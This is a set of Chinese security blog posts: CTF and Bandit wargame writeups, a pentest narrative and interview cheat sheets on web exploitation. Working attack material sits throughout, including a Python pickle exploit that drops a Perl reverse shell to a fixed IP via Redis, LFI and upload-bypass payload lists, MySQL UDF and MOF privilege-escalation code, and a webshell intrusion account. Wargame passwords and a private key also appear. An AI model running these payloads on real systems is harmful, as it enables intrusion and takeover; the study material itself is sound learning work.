这里重点关注的是&lt;!ENTITY test SYSTEM “file:///etc//passwd”&gt; SYSTEM后用来调用外部实体，因此我们可以利用各种协议来进行文件的读取亦或是ssrf。 4.FFmpeg任意文件读取漏洞 http://www.freebuf.com/vuls/138377.htmlhttp://www.jianshu.com/p/0c362b6b2669 漏洞出来挺久的了，一直没利用过，所以也没怎么关注。 5.ELK 甲方安全人员常说的Elk并不是单指一个系统，而是3款应用程序首位字母的大写集合，他们是12345Elasticsearch：日志分布式存储/搜索工具，原生支持集群功能，可以将指定时间的日志生成一个索引，加快日志查询和访问。Logstash：日志收集工具，可以从本地磁盘，网络服务（自己监听端口，接受用户日志），消息队列中收集各种各样的日志，然后进行过滤分析，并将日志输出到Elasticsearch中。Kibana：可视化日志Web展示工具，对Elasticsearch中存储的日志进行展示，还可以生成炫丽的仪表盘。 6.ubuntu无法获得锁解决 遇到很多次了，每次都要去百度，懒得搜了，就在这里记录下好了12sudo rm /var/cache/apt/archives/locksudo rm /var/lib/dpkg/lock 1sudo dpkg --configure -a dpkg:错误:正在解析文件 ‘/var/lib/dpkg/updates/0012’ 第 0 行附近:在字段名 #padding 中发现换行符 解决如下：123sudo rm /var/lib/dpkg/updates/*sudo apt-get updatesudo apt-get upgrade 精彩的渗透过程 p牛博客里的两篇文章:https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.htmlhttps://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html 1234567891.根据csrf-token的格式判断出使用的是flask(不会开发的黑客不是好黑客)2.根据ssrf判断目标端口，在进行图片上传时返回状态的区别猜测imagemagick组件漏洞的存在，虽然没成功，但这告诉我们日常的积累和经验很重要3.6379是redis系统，可能存在未授权访问漏洞4.Redis的协议是简单的文本流5.CVE-2016-5699(http://blog.neargle.com/SecNewsBak/drops/Python%20urllib%20HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html)[python的http头注入漏洞]6.redis未授权访问写入文件技巧7.Python2.7和3.5默认使用的序列化格式有所区别，一般带有括号和换行的序列化数据是2.7使用的，而包含\\x00的一般是3.5使用的。[又一次验证了熟悉开发的重要性]8.python反序列化过程中可以执行代码，利用session中的反序列化成功反弹shell9.挖漏洞思路还是得跳，之前一直在考虑怎么通过redis写文件来进行getshell，却没想到通过读取redis的备份文件，找到了突破口 顺便搬下p写的反序列化利用代码12345678910111213#!/usr/bin/env pythonimport cPickleimport osimport redisclass exp(object): def __reduce__(self): s = \"\"\"perl -e 'use Socket;$i=\"159.203.220.19\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/bash -i\");&#125;;'\"\"\" return (os.system, (s,))e = exp()s = cPickle.dumps(e)r = redis.Redis(host='xxx.xxx.xxx.xxx', port=6379, db=0)r.set(\"e6c36e69a9cf9543243d7921aa1a3d8093b49441\", s) 8.mac vmware fusion读取vmx文件 搜了好久，终于找到了这篇文章： http://forum.xitek.com/forum.php?mod=viewthread&amp;tid=1539470&amp;pid=64757745&amp;ordertype=1&amp;extra= 解决方法就是将包含vmx的那个文件夹更名为*加上后缀.vmvarevm 然后回到文件夹后直接双击既可运行。","tags":[{"name":"笔记","slug":"笔记","permalink":"https://doggy-test.github.io/tags/笔记/"}]},{"title":"某次渗透","date":"2017-06-02T00:18:00.000Z","path":"2017/06/02/某次渗透/","text":"一次未成功的渗透测试 花了两个多小时写了个简单调用zoomapi然后批量检测的poc框架，就拿phpmyadmin试了下，运气不错，遇到个root/123456的默认口令位于8000端口的phpmyadmin看到个moodle的库名，百度了下，是个常见的教育系统。然后就是简单测试了下文件读取的权限（select @@basedir）,有读取权限，但是要写入shell的话 要绝对路径。 于是先去80端口看了下，没有爆出路径，就猜测了几个 123456C:\\wwwrootC:\\wwwC:\\htdocsC:\\htdocs\\wwwC:\\htdoca\\wwwrootC:\\moodle 最后一个竟然猜中了。 接下来就是简单的写shell连菜刀，可是连菜刀的环节出了问题，爆了500错误，猜测应该有狗，就拿几个普通的命令试了下， 发现是可以执行的,就想着换个过够马或者大马，结果都是爆500错误，沮丧… 突然想到之前80端口的报错形式是iis7.5，那是不是支持asp和aspx呢？就传了个大马，发现果然可以执行 一般apsx的权限分配的较大，心想这次稳了，结果查看了下权限，是iisuser。 好吧～那就只能传exp看下提权(PS:看了下补丁，200多个，但是不能放弃希望啊)，果然没成功。 想着通过mysql提权，结果提权脚本无法运行，醉醉的，就先到这里了，有办法的话会继续更新…","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://doggy-test.github.io/tags/渗透测试/"}]},{"title":"iscc几道web的writeup","date":"2017-05-26T14:49:00.000Z","path":"2017/05/26/iscc几道web的writeup/","text":"iscc几道web的writeup web100 WelcomeToMySQL 点进链接是个上传界面，测了下是黑名单策略，可以上传php5文件，但php的几个函数也收到了限制 源代码有条提示(base.php里用户名和密码):那个看下base.php上传成功后访问:猜测是php访问mysql，于是上传:最后访问下得到flag: web150 我们一起来日站 先用扫描器扫到了一个robots.txt，查看了下访问后是这样子的那就继续扫，扫到了管理页面，密码填写’的时候报错了猜测存在注入,所以密码填写’or’=’or’即可 成功得到flag**web150 去年暑假的时候做过，貌似是原题,复制下当时记得好了。1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a[\"bar1\"])?die(\"nope\"):NULL; if(@$a[\"bar1\"])&#123; ($a[\"bar1\"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a[\"bar2\"]))&#123; if(count($a[\"bar2\"])!==5 OR !is_array($a[\"bar2\"][0])) die(\"nope\"); $pos = array_search(\"nudt\", $a[\"a2\"]); $pos===false?die(\"nope\"):NULL; foreach($a[\"bar2\"] as $key=&gt;$val)&#123; $val===\"nudt\"?die(\"nope\"):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(\"3|1|c\",$d.$c[0])?die(\"nope\"):NULL; strpos(($c[0].$d), \"htctf2016\")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include \"flag.php\"; echo $flag;&#125;?&gt; 考到的php弱类型的一系列知识12345if(is_array($a))&#123; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;])&#123; ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; &#125; 这里判断bar1是否是数字，如果是就die掉，不是下面又会比较。所以可以传递一个bar1=”2017a”即可2.123456789if(is_array(@$a[&quot;bar2&quot;]))&#123; if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;bar2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123; $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; &#125; $v2=1; &#125; 先判断bar2是否是数组，是进入下一步–&gt;判断数组元素个数是否为5并且第一个要是数组，进入下一步–&gt;判断a2数组是否存在nupt并且bar2的每一个元素值都不等于nudt–&gt;array_search 会使用’nudt’和array中的每个值作比较，而且intval(‘nudt’)==0,所以只要构造一个0就行,可以传bar2=[[“nut”],1,1,1,0]3.123456if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; &#125;&#125; 判断c[1]是否存在–&gt;strcmp($c[1],$d)要为0[这里可以传递一个数组]–&gt;c[1]!==$d[同样满足]–&gt;eregi(“3|1|c”,$d.$c[0])[eregi在遇到%00时停止]–&gt; strpos(($c[0].$d), “htctf2016”)[要求满足$c[0].$d=htctf2016]所以可以传cat[]=%00htctf2016&amp;cat[]=1&amp;dog[]=1 最后截下这次的flag web100 flag change flag 虽说是签到题，做的还是有点迷。12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;flag change flag!&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;You give me f1ag and I will give you flag too~~~&lt;/h1&gt;&lt;/center&gt;&lt;/br&gt;&lt;center&gt;&lt;form name=&quot;flag&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;hiddenflag&quot; value=&quot;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;flag&quot; value=&quot;Let&apos;s change flag&quot;&gt; &lt;/br&gt; &lt;input type=&quot;submit&quot; value=&quot;换FLAG!&quot;&gt;&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 先发个f1ag过去，提示提示不够，看到有个hiddenflag标签，再写下最后通过尝试，加了个FLAG=f1ag得到flag,纯靠运气，没意义的题目。 剩下的几道没做出来，看下writeup好了http://bobao.360.cn/ctf/detail/199.html","tags":[{"name":"writeup","slug":"writeup","permalink":"https://doggy-test.github.io/tags/writeup/"}]},{"title":"web安全知识补充(二)","date":"2017-05-10T23:28:00.000Z","path":"2017/05/11/web安全知识补充-二/","text":"接web安全知识补充(二) sqlmap盲注中快速匹配的参数 这题是道安恒的面试题，问到我的时候有些懵逼，貌似没用过这个参数，后来面试官告诉我是–string,确实没用过==,百度了下,就是匹配true时页面显示的内容 文件包含(LFI和RFI)在allow_url_include的条件下LFI就变成了RFI原理 在进行包含的时候没有对传递的文件名进行检查 常见姿势 include.php?filename=../../usr/local/apache2/conf/httpd.conf include.php?filename=http://test.com/test.txt[%00|#|?]进行截断(远程可用,且需要allow_url_fopen=On和且allow_url_include=On) include.php?filename=php://filter/read=convert.base64-encode/resource=/etc/passwd include.php?filename=data://text/plain;base64,SSBsb3ZlIFBIUAo= include.php?filename=php://input,然后post php代码 include.php?filename=proc/self/environ(包含环境信息) 1Useragent更改为 &lt;？php system（$ _ GET ['cmd']）; ？&gt; include.php?filename=/tmp/session_id(包含session路径) include.php?filename=/var/www/apachae2/access.log(包含日志信息) 解决方法1设置open_basedir 指纹 Web指纹有哪些1234567favicon.icoAPI：Wappalyzer API页面关键字 Powered by特殊文件名/文件hash/robots文件标签结构Http Response报错信息 工具扫描器具有的指纹信息(这个不会，直接copy下)12345678910111213141516171819202122Acunetix Web Vulnerability Scanner： http headers: Acunetix-Aspect Acunetix-Aspect-Password Acunetix-Aspect-Queries params: acunetix_wvs_security_test url: /acunetix-wvs-test-for-some-inexistent-file cookie params: acunetixCookie HP WebInspect: http headers: X-WIPP X-RequestManager-Memo X-Request-Memo X-Scan-Memo cookie params: CustomCookie Netsparker: params: netsparker 文件上传常见绕过黑名单限制1234567891011121314151617js检查绕过文件头检查绕过大小写绕过%00截断.jspxNTFS ADSiis6分号截断asp.asp;asp.jpgapache解析漏洞php.php.dddnginx解析漏洞(fashcgi解析)cer,asa,cdx.htaccess文件.user.inicontent-type检查绕过.php空格.php3 .php5 .phtml配合包含:.jpg包含,phar包含目录限制进行上跳 绕过waf限制1234567891011121314151617181920212223filename在content-type下面.asp&#123;80-90&#125;.asp…boundary不一致boundary和content-disposition中间插入换行hello.php:a.jpg然后hello.&lt;&lt;&lt;filename=php.phpfilename=&quot;a.txt&quot;;filename=&quot;a.php&quot;name=\\n&quot;file&quot;;filename=&quot;a.php&quot;content-disposition:\\na.jpg.\\nphp去掉content-disposition的form-data字段php&lt;5.3 单双引号截断特性删掉content-disposition: form-data;content-disposition\\00:&#123;char&#125;+content-dispositionhead头的content-type: tabhead头的content-type: multipart/form-DATAfilename后缀改为大写head头的Content-Type: multipart/form-data;\\nfile\\nname=&quot;php.php&quot;head头content-type空格:form-data字段与name字段交换位置 如何收集子域名1234567891011枚举，A记录对比DNS查询多重爆破前缀后缀处理SSL证书网站爬虫域传送漏洞搜索引擎crossdomain.xmlIP反查历史解析 逻辑漏洞测试一般流程1234首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包分析数据包，找到敏感部分分析后台找回机制所采用的验证手段修改数据包验证推测 身份认证123456未设置验证码且不限制错误次数，暴力破解注入漏洞验证码刷新不变(session不变),暴力破解提示信息(提示用户名不正确),暴力破解内部资料可下载泄露用户名密码规则,暴力破解cookie验证不严密,直接绕过 业务一致性1手机号/id/邮箱/订单号篡改 业务数据篡改1金额/商品数量/数量限制/js修改 业务授权 平行越权 1权限类型不变，权限ID改变 垂直越权 1权限ID不变，权限类型改变 短信验证码123纯数字验证(4/6位)不失效不限制发送次数 返回凭证123456url返回验证码及tokenresponse返回验证码密码找回凭证在页面中邮箱弱token导致可预测时间戳md5在重置密码链接改用户名 用户凭证有效性123验证码和手机号未关联邮件中的username未验证步骤缺乏中间验证 邮箱token1没起关联作用 重新绑定1越权绑定手机号 找回步骤1跳过验证步骤、找回方式，直接到设置新密码页面 本地验证1在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容 整体思路(百度来的总结) 如何日掉一个网站，思路12345678910111213141516171)信息收集， 1，获取域名的whois信息,获取注册者邮箱姓名电话等。 2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。 3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞 4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。 5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针 6，google hack 进一步探测网站的信息，后台，敏感文件2）漏洞扫描 开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等3）漏洞利用 利用以上的方式拿到webshell，或者其他权限4）权限提升 提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉， linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysqlsystem提权以及oracle低权限提权5) 日志清理6）总结报告及修复方案 如何进行代码审计(安恒面试有问，但是自己答得不好)123通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文件。[只答了这点]看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是否出现漏洞。继续跟读首页文件,index.php,了解程序运作时调用了哪些函数和文件 以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读。 只有后台如何渗透12345注入?爆破？社工？端口？cookie？ 如何获得网站后台路径1234567891011121.显示在首页链接2.google hack3.robots.txt4.admin 302直接跳转到管理路径5.爬虫扫描获得6.后台字典暴力破解7.iis6短路径8.数据库中暴露9.已知cms10.位于其他端口11.位于某一子域12.xss打到后台","tags":[{"name":"安全","slug":"安全","permalink":"https://doggy-test.github.io/tags/安全/"}]},{"title":"Bandit题目记录","date":"2017-05-07T20:16:00.000Z","path":"2017/05/08/Bandit题目记录/","text":"做 http://overthewire.org/wargames/bandit/ 的记录 Level 0、1 没什么好说的，直接ssh登进去,cd到/home/bandit0下,cat下readme即可,拿到bandit1的ssh密码:boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 2 ssh登陆进去提示是-开头的文件，针对这种特殊字符文件的操作，需要使用–或者./，所以这题直接cat ./-即可，拿到bandit2的密码:CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level 3 和第二题类似，加个引号就可以了,用cat ./“spaces in this filename” 拿到bandit3的密码:UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level 4 提示inhere下有隐藏文件，直接ls -al找到隐藏文件.hidden，查看文件内容即可，拿到bandit4的密码:pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level 5 目录下一共100个文件，一个个打开试了下，在file07下翻到密码bandit5的密码为koReBOKuIDDepwhWk7jZC0RTdopnAYKh:，不知道有没有什么更好的办法== Level 6 提示inhere下很多文件，但密码文件为1033字节，那直接用find命令就好:find inhere -size 1033c，找到文件路径:inhere/maybehere07/.file2,cat下得到bandit6的密码 Level 7 提示在某个文件夹下，那就全盘查找好了。给出了3个条件，所以find命令为:find / -user “bandit7” -group “bandit6” -size 33c，找到bandit7的路径，得到bandit7的密码:HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level 8 提示在”millionth”单词后，所以找到所在行即可，所以用cat data.txt | grep millionth,得到bandit8的密码:cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level 9 提示只出现一次，那么排序去重就好了，所以用命令sort data.txt |uniq -u得到bandit9的密码:UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level 10 提示不可读字符中找出可读字符，那么用strings即可，输入strings data.txt得到bandit10的密码:truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level 11 提示base64加密过的文档，那么解密就可，用cat data.txt | base64 -d 得到bandit11的密码为:IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level 12 提示移位13位，就是常用的rot13加密方法，想着用python或者php直接rot13()写来着，不过看到提示中有个tr命令，百度了一下，是用于字符替换的，这样一来就简单了。可以用命令cat data.txt | tr ‘a-z’ ‘n-za-m’|tr ‘A-Z’ ‘N-ZA-M’得到密码:5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level 13 提示经过压缩加密,察看了下提示的命令:xxd,用于用二进制或16进制显示文件的内容，所以先用xxd -r data.txt data转换成2进制,顺便看了下文件头:1f8b,是gzip文件,所以先用xxd -r data.txt data.gz生成gz文件,然后用gzip -d data.gz解压，解压完成,查看文件头为425a,是bz文件,类似的重命名后用bzip2 -d data.bz2生成新文件,然后用tar -xvf解压多次,最后一次还是gzip解压最后得到密码:The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level 14 提示用私钥去登陆,但是先要修改下权限:chmod 600 ./ssh_private,然后直接ssh -i ./ssh_private bandit14@localhost Level 15 提示用nc连接30000端口,连接成功让输入一段内容,在/etc/bandit_pass/bandit14下,得到密码:BfMYroe26WYalil77FoDi9qh59eK5xNr Level 16 提示ssl连接,于是使用openssl,百度了下，可以用openssl s_client -connect localhost:30001 -quiet , s_client表示连接服务端,-quiet-quiet用以关闭session和证书的信息，同时打开-ign_eof这个选项。前者可简化显示的界面，后者则保证在输入完成后不是立即断开连接。把本关密码发送,得到下一关密码:cluFn7wTiGryunymYOu4RcffSxQluehd Level 17 提示在某一端口段寻找合适端口，所以要用到提示的nmap命令,直接nmap localhost -sV -p31000-32000探测到5个端口，有3个是echo,再用上题的命令试了试另两个,端口是31790,输入密码得到一串私钥123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY----- 在tmp中新建文件夹后,保存为ssh_private后登陆,即可登陆，但要注意权限需要600，否则仍会要求密码登陆。 Level 18 提示两个文件仅一行不一样，那么用diff就可以了,得到密码:kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd,但登陆后马上登出 Level 19 这关提示.bashrc做了配置导致登陆，所以需要查看readme,所以可以用命令:ssh bandit18@localhost ‘cat ./readme’,得到下一关的密码为:IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Level 20 提示目录下的文件具有setuid权限,能够在程序中调用setuid()系统调用，将自身的suid改成与euid相同，也就是在运行中作为bandit20执行命令。对于手头的这个文件，只要将欲执行的命令作为参数传入即可。用命令:./bandit20-do cat /etc/bandit_pass/bandit20,得到下一关密码:GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level 21 提示setuid文件可以链接一个服务端，然后那边如果发送了20关的密码并且正确，这边就会回给服务端下一关的密码,所以需要开启两个shell,一个搭建服务端,一个作为客户端,服务端用:nc -l 12345,客户端直接执行当前文件./suconnect 12345,服务端发送上关密码,得到密码:gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Level 22 要求查看/etc/cron.d下的计划任务, 看下bandit22对应的计划任务为:1* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null 再查看下/usr/bin/cronjob_bandit22.sh123#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22&gt;/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv 那么直接查看/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv得到下关密码:Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level 23 与上关类似,先看下bandit23对应的计划任务1* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null 再查看下/usr/bin/cronjob_bandit23.sh12345#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget 很好理解,将”I an user bandit22”MD5后截取MD5部分作为文件,将不可读密码写入文件中,所以可以先输出文件名,用命令:echo I am user bandit23 | md5sum | cut -d ‘ ‘ -f 1得到文件名,再cat下得到密码:jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Level 24 一样的套路,读取/usr/bin/cronjob_bandit24.sh的内容为12345678910111213#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho \"Executing and deleting all scripts in /var/spool/$myname:\"for i in * .*;do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" timeout -s 9 60 \"./$i\" rm -f \"./$i\" fidone 意思是每分钟都会把/var/spool/bandit24当前目录下所有文件执行一遍后删除,那么只要在当前目录下写个shell将执行结果保存就好:12#/bin/bashcat /etc/bandit_pass/bandit24 &gt; /tmp/test2333/test.txt 等待一分钟后即可[PS:不要忘记执行和写权限],得到密码:UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level 25 提示发送bandit24的密码加4位数字验证码到30002端口就会收到回复，用python即可12345678910111213141516171819202122#encoding=UTF-8import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try: s.connect(( \"localhost\", 30002)) print s.recv(1024) for i in range(10): for j in range(10): for m in range(10): for n in range(10): str1 = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;\\r\\n'.format(str(i),str(j),str(m),str(n)) s.send(str1) print \"sending\"+str1 feedback=s.recv(1024) if not feedback: s.close() else: if \"password\" in feedback: print feedbackexcept Exception,e: print es.close() 很快得到密码:uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Level 26 提示shell并不是/bin/bash,看本地/etc/passwd中bandit26的shell在/usr/binshowtext,查看下显示123#!/bin/shmore ~/text.txtexit 0 想了一会，还是不知道怎么做,网上搜了下教程说将终端缩到只显示两行,让more显示不完,而后命令v调用vim,在利用vim调用外部文件的选项得到密码,试了下,果然可以,用:r /etc/bandit_pass/bandit26得到密码:5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z","tags":[{"name":"Linux","slug":"Linux","permalink":"https://doggy-test.github.io/tags/Linux/"}]},{"title":"web安全知识补充(一)","date":"2017-05-02T19:40:00.000Z","path":"2017/05/03/web安全知识补充-一/","text":"针对 https://lc4t.github.io/2017/03/06/web-security-interview/ ,文章已经写得很全了，添加点自己的东西,顺便搬过来一些(万一他网站挂了==)。想到哪里写哪里好了，留待自己实习或者秋招面试前复习下。 很多类型的洞自己也没实践过，只是理论，所以难免理解有所偏差甚至错误。随着知识的加深，会稍作更改 关于mysql提权UDF提权，目录位置 针对windows,数据库版本为 5.0 以下的我们要将udf.dll文件导出在 C:\\Windows\\udf.dll 下,5.0-5.1间要在C:\\windows\\systems32下,而&gt;5.1的版本需要在mysql安装目录下的plugin目录下进行上传。 上传udf的代码如下:12345678show variables like ‘%plugin%’;plugin_dir: /usr/bin/mysql/plugin (need rw)uname -aselect hex(load_file(‘/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so’)) into outfile ‘/tmp/udf.txt’;select unhex(‘7F454C46020…’) into dumpfile ‘/usr/lib/mysql/plugin/mysqludf.so’;nm -D /usr/lib/mysql/plugin/mysqludf.socreate function sys_eval returns string soname “mysqludf.so”;select sys_eval(‘whoami’); 原理:1利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库,从而利用system权限进行提权操作 mof提权，需要写目录上传权限12345678910111213141516171819202122#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")instance of __EventFilter as $EventFilter&#123; EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\";&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123; Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user [username] [password] /add\\\")\";&#125;;instance of __FilterToConsumerBinding&#123; Consumer = $Consumer; Filter = $EventFilter;&#125;; 不过mof只能在windows有效，并且需要上传在c:/windows/system32/wbem/mof/目录下.12select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos; 原理(百度来的):123mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做&quot;托管对象格式&quot;其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 另外提一下mysq注入写入shell，需要两个条件 网站根路径 拥有写权限，且文件夹可写 在缺少第一个条件的情况下，需要知道网站根路径，可以采取类似爆破网站路径以及配置文件路径的方式，或者查看是否存在phpinfo界面以及报错泄露根路径。 在缺少第二个条件的情况下，如果是secure-file-priv为off，且在phpmyadmin下,可以用日志包含的方式写入shell,具体方法:http://blog.csdn.net/yizhou35/article/details/12162513，或者尝试自己添加file权限[PS:mysql权限管理:这篇文章写得还行 http://www.cnblogs.com/Richardzhu/p/3318595.html] 如果sql注入中过滤了引号，是否可以进行读写 读可以，但写不行。 